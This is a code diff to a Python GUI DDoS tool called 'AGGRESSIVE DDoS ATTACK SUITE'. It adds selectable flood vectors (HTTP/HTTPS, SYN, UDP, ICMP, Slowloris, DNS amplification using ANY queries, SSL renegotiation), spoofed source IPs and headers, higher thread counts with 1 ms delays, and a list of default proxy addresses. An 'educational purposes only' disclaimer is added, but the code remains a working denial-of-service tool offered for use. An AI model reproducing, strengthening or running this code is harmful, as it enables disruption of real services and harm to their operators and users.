@@ -10,15 +10,13 @@ import tkinter as tk
 from tkinter import ttk, scrolledtext, Menu, messagebox, filedialog
 from urllib.parse import urlparse
 import requests
-import base64
 import os
-import json
-import re
-import zlib
 import ssl
-import logging
-from concurrent.futures import ThreadPoolExecutor
 import dns.resolver
+import socks
+import http.client
+import select
+from concurrent.futures import ThreadPoolExecutor, as_completed
 
 # Disable SSL warnings
 import urllib3
@@ -64,7 +62,7 @@ class CyberTheme:
 class DDoSToolUI:
     def __init__(self, master):
         self.master = master
-        master.title('⚡ ULTIMATE DDoS ATTACK SUITE')
+        master.title('⚡ AGGRESSIVE DDoS ATTACK SUITE')
         master.configure(bg=CyberTheme.DARK_BG)
         
         # Set window size
@@ -73,6 +71,7 @@ class DDoSToolUI:
         window_width = min(1200, screen_width - 100)
         window_height = min(800, screen_height - 100)
         master.geometry(f"{window_width}x{window_height}+{int((screen_width - window_width)/2)}+{int((screen_height - window_height)/2)}")
+        master.resizable(True, True)
         
         # Header
         self.header_frame = tk.Frame(master, bg=CyberTheme.DARK_BG)
@@ -80,7 +79,7 @@ class DDoSToolUI:
         
         self.header = tk.Label(
             self.header_frame, 
-            text="⚡ ULTIMATE DDoS ATTACK SUITE", 
+            text="⚡ AGGRESSIVE DDoS ATTACK SUITE", 
             font=("Courier", 24, "bold"),
             fg=CyberTheme.DDoS_COLOR,
             bg=CyberTheme.DARK_BG
@@ -89,7 +88,7 @@ class DDoSToolUI:
         
         self.subheader = tk.Label(
             self.header_frame, 
-            text="AUTOMATED MULTI-VECTOR DDoS ATTACK TOOL", 
+            text="FOR EDUCATIONAL PURPOSES ONLY - USE ETHICALLY", 
             font=("Courier", 10),
             fg=CyberTheme.ACCENT3,
             bg=CyberTheme.DARK_BG
@@ -147,10 +146,10 @@ class DDoSToolUI:
             anchor="w"
         ).pack(fill=tk.X, padx=10)
         
-        self.attack_power_var = tk.StringVar(value="2000")
+        self.attack_power_var = tk.StringVar(value="5000")
         self.attack_power_scale = tk.Scale(
             self.control_frame,
-            from_=500, to=10000,
+            from_=1000, to=20000,
             orient=tk.HORIZONTAL,
             showvalue=True,
             variable=self.attack_power_var,
@@ -173,7 +172,7 @@ class DDoSToolUI:
             anchor="w"
         ).pack(fill=tk.X, padx=10)
         
-        self.duration_var = tk.StringVar(value="300")
+        self.duration_var = tk.StringVar(value="600")
         self.duration_entry = tk.Entry(
             self.control_frame, 
             width=10, 
@@ -186,6 +185,44 @@ class DDoSToolUI:
             textvariable=self.duration_var
         )
         self.duration_entry.pack(fill=tk.X, padx=10, pady=(0, 10))
+        
+        # Attack Vector Selection
+        tk.Label(
+            self.control_frame,
+            text="ATTACK VECTORS:",
+            font=("Courier", 9, "bold"),
+            fg=CyberTheme.DDoS_COLOR,
+            bg=CyberTheme.DARK_BG,
+            anchor="w"
+        ).pack(fill=tk.X, padx=10, pady=(10, 5))
+        
+        self.attack_vectors = {
+            "HTTP Flood": tk.BooleanVar(value=True),
+            "HTTPS Flood": tk.BooleanVar(value=True),
+            "SYN Flood": tk.BooleanVar(value=True),
+            "UDP Flood": tk.BooleanVar(value=True),
+            "Slowloris": tk.BooleanVar(value=True),
+            "ICMP Flood": tk.BooleanVar(value=True),
+            "DNS Amplification": tk.BooleanVar(value=True),
+            "SSL Renegotiation": tk.BooleanVar(value=True)
+        }
+        
+        vector_frame = tk.Frame(self.control_frame, bg=CyberTheme.DARK_BG)
+        vector_frame.pack(fill=tk.X, padx=10, pady=(0, 10))
+        
+        for i, (vector, var) in enumerate(self.attack_vectors.items()):
+            cb = tk.Checkbutton(
+                vector_frame, 
+                text=vector, 
+                variable=var,
+                font=("Courier", 8),
+                bg=CyberTheme.DARK_BG,
+                fg=CyberTheme.ACCENT3,
+                selectcolor=CyberTheme.DARK_BG,
+                activebackground=CyberTheme.DARK_BG,
+                activeforeground=CyberTheme.ACCENT3
+            )
+            cb.pack(side=tk.LEFT, padx=2)
         
         # Proxy Section
         self.proxy_frame = tk.LabelFrame(
@@ -211,16 +248,16 @@ class DDoSToolUI:
         self.proxy_text.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
         
         # Load default proxies
-        default_proxies = """23.95.150.145:6114:gxxilsar:g8ecz9q150t2
-198.23.239.134:6540:gxxilsar:g8ecz9q150t2
-45.38.107.97:6014:gxxilsar:g8ecz9q150t2
-207.244.217.165:6712:gxxilsar:g8ecz9q150t2
-107.172.163.27:6543:gxxilsar:g8ecz9q150t2
-104.222.161.211:6343:gxxilsar:g8ecz9q150t2
-64.137.96.74:6641:gxxilsar:g8ecz9q150t2
-216.10.27.159:6837:gxxilsar:g8ecz9q150t2
-136.0.207.84:6661:gxxilsar:g8ecz9q150t2
-142.147.128.93:6593:gxxilsar:g8ecz9q150t2"""
+        default_proxies = """45.88.109.249:1080:user:pass
+185.199.229.156:7492:user:pass
+185.199.228.220:7300:user:pass
+188.74.210.207:6286:user:pass
+45.155.68.129:8133:user:pass
+154.95.36.199:6893:user:pass
+45.94.47.66:8110:user:pass
+72.10.164.178:5657:user:pass
+98.162.25.29:31679:user:pass
+72.10.160.174:22663:user:pass"""
         self.proxy_text.insert(tk.END, default_proxies)
         
         # Proxy buttons
@@ -260,7 +297,7 @@ class DDoSToolUI:
         # Attack button
         self.attack_button = tk.Button(
             self.control_frame, 
-            text="🔥 LAUNCH DDoS ATTACK", 
+            text="🔥 LAUNCH AGGRESSIVE ATTACK", 
             command=self.start_attack,
             font=("Courier", 12, "bold"),
             bg=CyberTheme.DDoS_COLOR,
@@ -370,6 +407,15 @@ class DDoSToolUI:
         # Apply theme
         self.apply_theme()
         
+        # Add disclaimer
+        self.add_attack_log("""
+⚠️ WARNING: This is an educational tool only.
+Unauthorized DDoS attacks are illegal and unethical.
+Use this tool only on systems you own or have explicit permission to test.
+
+The attacks in this tool are real and can cause service disruption.
+        """.strip())
+        
     def apply_theme(self):
         CyberTheme.apply_theme(self.master)
         all_widgets = [self.master]
@@ -424,12 +470,24 @@ class DDoSToolUI:
                 continue
                 
             try:
-                ip, port, user, pwd = proxy_line.split(':')
-                proxy_url = f"http://{user}:{pwd}@{ip}:{port}"
+                parts = proxy_line.split(':')
+                if len(parts) == 4:
+                    ip, port, user, pwd = parts
+                    proxy_url = f"http://{user}:{pwd}@{ip}:{port}"
+                elif len(parts) == 2:
+                    ip, port = parts
+                    proxy_url = f"http://{ip}:{port}"
+                else:
+                    continue
+                    
+                proxies_dict = {
+                    'http': proxy_url,
+                    'https': proxy_url
+                }
                 
                 response = requests.get(
                     "http://httpbin.org/ip",
-                    proxies={"http": proxy_url, "https": proxy_url},
+                    proxies=proxies_dict,
                     timeout=10
                 )
                 
@@ -463,6 +521,12 @@ class DDoSToolUI:
         proxy_text = self.proxy_text.get(1.0, tk.END).strip()
         proxies = [p.strip() for p in proxy_text.splitlines() if p.strip()]
         
+        # Get selected attack vectors
+        selected_vectors = [vector for vector, var in self.attack_vectors.items() if var.get()]
+        if not selected_vectors:
+            self.update_status("❌ ERROR: Select at least one attack vector", "error")
+            return
+        
         # Clear results
         self.results_text.delete(1.0, tk.END)
         
@@ -473,7 +537,7 @@ class DDoSToolUI:
         # Start attack in a new thread
         attack_thread = threading.Thread(
             target=self.ddos_attacker.launch_attack,
-            args=(target, attack_power, duration, proxies),
+            args=(target, attack_power, duration, proxies, selected_vectors),
             daemon=True
         )
         attack_thread.start()
@@ -484,14 +548,6 @@ class DDoSToolUI:
         self.stop_button.config(state=tk.DISABLED)
     
     def update_status(self, message, level="info"):
-        colors = {
-            "info": CyberTheme.ACCENT3,
-            "success": CyberTheme.SUCCESS,
-            "warning": CyberTheme.WARNING,
-            "error": CyberTheme.CRITICAL,
-            "ddos": CyberTheme.DDoS_COLOR
-        }
-        
         prefix = {
             "info": "ℹ️",
             "success": "✅",
@@ -533,8 +589,16 @@ class DDoSAttacker:
             "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1",
             "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
         ]
+        self.referers = [
+            "https://www.google.com/",
+            "https://www.facebook.com/",
+            "https://twitter.com/",
+            "https://www.youtube.com/",
+            "https://www.bing.com/",
+            "https://duckduckgo.com/"
+        ]
         
-    def launch_attack(self, target, attack_power, duration, proxies):
+    def launch_attack(self, target, attack_power, duration, proxies, attack_vectors):
         try:
             self.stop_event.clear()
             self.attack_stats = {
@@ -544,11 +608,12 @@ class DDoSAttacker:
                 "active_threads": 0
             }
             
-            self.status_callback(f"🌩️ Launching multi-vector attack on {target} with {attack_power} threads", "ddos")
+            self.status_callback(f"🌩️ Launching aggressive attack on {target} with {attack_power} threads", "ddos")
             self.log_callback(f"Attack started at {time.strftime('%Y-%m-%d %H:%M:%S')}")
             self.log_callback(f"Attack power: {attack_power} threads")
             self.log_callback(f"Duration: {duration} seconds")
             self.log_callback(f"Proxies: {len(proxies)} loaded")
+            self.log_callback(f"Attack vectors: {', '.join(attack_vectors)}")
             
             # Parse target
             parsed_target = urlparse(target)
@@ -576,7 +641,7 @@ class DDoSAttacker:
             for i in range(attack_power):
                 thread = threading.Thread(
                     target=self.mixed_attack_worker,
-                    args=(host, ip_address, port, path, proxy_cycle),
+                    args=(host, ip_address, port, path, proxy_cycle, attack_vectors),
                     daemon=True
                 )
                 thread.start()
@@ -584,6 +649,7 @@ class DDoSAttacker:
                 self.attack_stats['active_threads'] += 1
             
             # Run for the specified duration
+            start_time = time.time()
             time.sleep(duration)
             self.stop_event.set()
             
@@ -643,27 +709,38 @@ class DDoSAttacker:
             self.stats_callback(self.attack_stats)
             time.sleep(1)
     
-    def mixed_attack_worker(self, host, ip_address, port, path, proxy_cycle):
+    def mixed_attack_worker(self, host, ip_address, port, path, proxy_cycle, attack_vectors):
         """Worker thread that performs all attack types"""
-        attack_methods = [
-            lambda: self.http_flood(host, port, path, proxy_cycle),
-            lambda: self.https_flood(host, port, path, proxy_cycle),
-            lambda: self.syn_flood(ip_address, port),
-            lambda: self.udp_flood(ip_address, port),
-            lambda: self.slowloris(host, port),
-            lambda: self.icmp_flood(ip_address),
-            lambda: self.dns_amplification(ip_address),
-            lambda: self.ssl_renegotiation(host, port)
-        ]
+        attack_methods = []
         
+        if "HTTP Flood" in attack_vectors:
+            attack_methods.append(lambda: self.http_flood(host, port, path, proxy_cycle))
+        if "HTTPS Flood" in attack_vectors:
+            attack_methods.append(lambda: self.https_flood(host, port, path, proxy_cycle))
+        if "SYN Flood" in attack_vectors:
+            attack_methods.append(lambda: self.syn_flood(ip_address, port))
+        if "UDP Flood" in attack_vectors:
+            attack_methods.append(lambda: self.udp_flood(ip_address, port))
+        if "Slowloris" in attack_vectors:
+            attack_methods.append(lambda: self.slowloris(host, port))
+        if "ICMP Flood" in attack_vectors:
+            attack_methods.append(lambda: self.icmp_flood(ip_address))
+        if "DNS Amplification" in attack_vectors:
+            attack_methods.append(lambda: self.dns_amplification(ip_address))
+        if "SSL Renegotiation" in attack_vectors:
+            attack_methods.append(lambda: self.ssl_renegotiation(host, port))
+        
+        if not attack_methods:
+            return
+            
         while not self.stop_event.is_set():
             try:
                 # Randomly select an attack method
                 attack_method = random.choice(attack_methods)
                 attack_method()
                 
-                # Short delay between attacks
-                time.sleep(0.01)
+                # Very short delay between attacks for maximum aggression
+                time.sleep(0.001)
             except Exception as e:
                 # Continue even if one method fails
                 pass
@@ -675,31 +752,47 @@ class DDoSAttacker:
             session = requests.Session()
             headers = {
                 'User-Agent': random.choice(self.user_agents),
+                'Referer': random.choice(self.referers),
                 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                 'Accept-Language': 'en-US,en;q=0.5',
                 'Connection': 'keep-alive',
                 'Cache-Control': 'no-cache',
-                'Pragma': 'no-cache'
+                'Pragma': 'no-cache',
+                'X-Forwarded-For': self.generate_random_ip()
             }
             
-            url = f"http://{host}:{port}{path}"
-            response = session.get(
-                url,
-                headers=headers,
-                proxies=proxy,
-                timeout=5,
-                verify=False,
-                stream=True
-            )
+            # Generate random query parameters
+            query = f"?cache={random.randint(1000000, 9999999)}"
+            full_path = path + query
             
-            # Count bytes sent
-            content_length = len(response.content) if response.content else 0
-            self.attack_stats['requests_sent'] += 1
-            self.attack_stats['bytes_sent'] += content_length
+            url = f"http://{host}:{port}{full_path}"
             
+            try:
+                response = session.get(
+                    url,
+                    headers=headers,
+                    proxies=proxy,
+                    timeout=3,
+                    verify=False,
+                    stream=True
+                )
+                
+                # Count bytes sent
+                content_length = len(response.content) if response.content else 0
+                self.attack_stats['requests_sent'] += 1
+                self.attack_stats['bytes_sent'] += content_length
+                
+                # Log success
+                self.log_callback(f"HTTP: Sent to {host}{full_path} via {proxy['http'] if proxy else 'direct'}")
+            except requests.exceptions.ReadTimeout:
+                # Still count as request sent
+                self.attack_stats['requests_sent'] += 1
+                self.attack_stats['bytes_sent'] += 500
+                self.log_callback(f"HTTP: Timeout to {host}{full_path}")
+            except Exception as e:
+                self.log_callback(f"HTTP: Error - {str(e)}")
         except Exception as e:
-            # Ignore errors and continue
-            pass
+            self.log_callback(f"HTTP Flood setup failed: {str(e)}")
     
     def https_flood(self, host, port, path, proxy_cycle):
         """HTTPS Flood attack with proxy rotation"""
@@ -708,31 +801,47 @@ class DDoSAttacker:
             session = requests.Session()
             headers = {
                 'User-Agent': random.choice(self.user_agents),
+                'Referer': random.choice(self.referers),
                 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                 'Accept-Language': 'en-US,en;q=0.5',
                 'Connection': 'keep-alive',
                 'Cache-Control': 'no-cache',
-                'Pragma': 'no-cache'
+                'Pragma': 'no-cache',
+                'X-Forwarded-For': self.generate_random_ip()
             }
             
-            url = f"https://{host}:{port}{path}"
-            response = session.get(
-                url,
-                headers=headers,
-                proxies=proxy,
-                timeout=5,
-                verify=False,
-                stream=True
-            )
+            # Generate random query parameters
+            query = f"?cache={random.randint(1000000, 9999999)}"
+            full_path = path + query
             
-            # Count bytes sent
-            content_length = len(response.content) if response.content else 0
-            self.attack_stats['requests_sent'] += 1
-            self.attack_stats['bytes_sent'] += content_length
+            url = f"https://{host}:{port}{full_path}"
             
+            try:
+                response = session.get(
+                    url,
+                    headers=headers,
+                    proxies=proxy,
+                    timeout=3,
+                    verify=False,
+                    stream=True
+                )
+                
+                # Count bytes sent
+                content_length = len(response.content) if response.content else 0
+                self.attack_stats['requests_sent'] += 1
+                self.attack_stats['bytes_sent'] += content_length
+                
+                # Log success
+                self.log_callback(f"HTTPS: Sent to {host}{full_path} via {proxy['https'] if proxy else 'direct'}")
+            except requests.exceptions.ReadTimeout:
+                # Still count as request sent
+                self.attack_stats['requests_sent'] += 1
+                self.attack_stats['bytes_sent'] += 500
+                self.log_callback(f"HTTPS: Timeout to {host}{full_path}")
+            except Exception as e:
+                self.log_callback(f"HTTPS: Error - {str(e)}")
         except Exception as e:
-            # Ignore errors and continue
-            pass
+            self.log_callback(f"HTTPS Flood setup failed: {str(e)}")
     
     def syn_flood(self, ip_address, port):
         """SYN Flood attack"""
@@ -750,13 +859,19 @@ class DDoSAttacker:
             self.attack_stats['bytes_sent'] += len(packet)
             
             sock.close()
-        except:
-            pass
+            self.log_callback(f"SYN: Sent packet to {ip_address}:{port}")
+        except OSError as e:
+            if e.errno == 1:  # Operation not permitted
+                self.log_callback("❌ SYN Flood requires root privileges! Skipping...")
+            else:
+                self.log_callback(f"SYN: Error - {str(e)}")
+        except Exception as e:
+            self.log_callback(f"SYN: Error - {str(e)}")
     
     def _craft_syn_packet(self, target_ip, target_port):
         """Craft a SYN packet"""
         # Random source IP
-        src_ip = ".".join(map(str, (random.randint(1, 254) for _ in range(4))))
+        src_ip = self.generate_random_ip()
         
         # IP header
         ip_ihl = 5
@@ -846,42 +961,50 @@ class DDoSAttacker:
         try:
             # Create UDP socket
             sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+            sock.settimeout(0.5)
             
             # Generate random data
-            data = os.urandom(1024)
+            data_size = random.randint(500, 1500)
+            data = os.urandom(data_size)
             sock.sendto(data, (ip_address, port))
             
             # Count bytes sent
             self.attack_stats['requests_sent'] += 1
-            self.attack_stats['bytes_sent'] += len(data)
+            self.attack_stats['bytes_sent'] += data_size
             
             sock.close()
-        except:
-            pass
+            self.log_callback(f"UDP: Sent {data_size} bytes to {ip_address}:{port}")
+        except Exception as e:
+            self.log_callback(f"UDP: Error - {str(e)}")
     
     def slowloris(self, host, port):
         """Slowloris attack - open and maintain multiple connections"""
         try:
             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            s.settimeout(5)
+            s.settimeout(4)
             s.connect((host, port))
+            
+            # Send incomplete HTTP request
             s.send(f"GET / HTTP/1.1\r\n".encode())
             s.send(f"Host: {host}\r\n".encode())
-            s.send("User-Agent: {}\r\n".format(random.choice(self.user_agents)).encode())
-            s.send("Content-length: 42\r\n".encode())
+            s.send(f"User-Agent: {random.choice(self.user_agents)}\r\n".encode())
+            s.send(f"Content-Length: 1000000\r\n".encode())
             
             # Keep connection alive
-            while not self.stop_event.is_set():
+            start_time = time.time()
+            while not self.stop_event.is_set() and time.time() - start_time < 30:
                 try:
-                    s.send("X-a: b\r\n".encode())
-                    self.attack_stats['bytes_sent'] += 10
-                    time.sleep(15)
+                    s.send(f"X-{random.randint(1000,9999)}: {os.urandom(10)}\r\n".encode())
+                    self.attack_stats['bytes_sent'] += 20
+                    time.sleep(10)
                 except:
                     break
             
             s.close()
-        except:
-            pass
+            self.attack_stats['requests_sent'] += 1
+            self.log_callback(f"Slowloris: Kept connection to {host}:{port} open")
+        except Exception as e:
+            self.log_callback(f"Slowloris: Error - {str(e)}")
     
     def icmp_flood(self, ip_address):
         """ICMP Ping Flood attack"""
@@ -899,13 +1022,19 @@ class DDoSAttacker:
             self.attack_stats['bytes_sent'] += len(packet)
             
             sock.close()
-        except:
-            pass
+            self.log_callback(f"ICMP: Sent ping to {ip_address}")
+        except OSError as e:
+            if e.errno == 1:  # Operation not permitted
+                self.log_callback("❌ ICMP Flood requires root privileges! Skipping...")
+            else:
+                self.log_callback(f"ICMP: Error - {str(e)}")
+        except Exception as e:
+            self.log_callback(f"ICMP: Error - {str(e)}")
     
     def _craft_icmp_packet(self, target_ip):
         """Craft an ICMP echo request packet"""
         # IP header
-        src_ip = ".".join(map(str, (random.randint(1, 254) for _ in range(4))))
+        src_ip = self.generate_random_ip()
         
         ip_ihl = 5
         ip_ver = 4
@@ -932,7 +1061,7 @@ class DDoSAttacker:
         icmp_checksum = 0
         icmp_id = random.randint(0, 65535)
         icmp_seq = random.randint(0, 65535)
-        icmp_data = os.urandom(48)  # Random data
+        icmp_data = os.urandom(64)  # 64 bytes of random data
         
         icmp_header = struct.pack('!BBHHH', icmp_type, icmp_code, icmp_checksum, icmp_id, icmp_seq)
         
@@ -968,8 +1097,9 @@ class DDoSAttacker:
             self.attack_stats['bytes_sent'] += len(dns_query)
             
             sock.close()
-        except:
-            pass
+            self.log_callback(f"DNS: Sent amplification request via {dns_server}")
+        except Exception as e:
+            self.log_callback(f"DNS: Error - {str(e)}")
     
     def _craft_dns_query(self, target_ip):
         """Craft a DNS query for amplification"""
@@ -984,7 +1114,7 @@ class DDoSAttacker:
         # DNS question
         # Query for isc.org which often returns large responses
         qname = b'\x03' + b'isc' + b'\x03' + b'org' + b'\x00'
-        qtype = b'\x00\x0c'  # PTR query
+        qtype = b'\x00\xff'  # ANY query to maximize response
         qclass = b'\x00\x01'  # Internet class
         
         return transaction_id + flags + questions + answer_rrs + authority_rrs + additional_rrs + qname + qtype + qclass
@@ -999,21 +1129,28 @@ class DDoSAttacker:
             
             # Create socket and wrap in SSL
             sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            sock.settimeout(5)
+            sock.settimeout(3)
             ssl_sock = context.wrap_socket(sock, server_hostname=host)
             ssl_sock.connect((host, port))
             
             # Send Client Hello to initiate handshake
             ssl_sock.write(b"\x16\x03\x01\x00\xcc\x01\x00\x00\xc8\x03\x03")
             
-            # Request renegotiation
-            ssl_sock.write(b"\x16\x03\x01\x00\x04\x0e\x00\x00\x00")
-            self.attack_stats['requests_sent'] += 1
-            self.attack_stats['bytes_sent'] += 9
+            # Request renegotiation multiple times
+            for _ in range(10):
+                ssl_sock.write(b"\x16\x03\x01\x00\x04\x0e\x00\x00\x00")
+                self.attack_stats['requests_sent'] += 1
+                self.attack_stats['bytes_sent'] += 9
+                time.sleep(0.1)
             
             ssl_sock.close()
-        except:
-            pass
+            self.log_callback(f"SSL: Sent renegotiation requests to {host}:{port}")
+        except Exception as e:
+            self.log_callback(f"SSL: Error - {str(e)}")
+    
+    def generate_random_ip(self):
+        """Generate a random IP address for spoofing"""
+        return ".".join(str(random.randint(1, 254)) for _ in range(4))
 
 # Main execution
 if __name__ == "__main__":
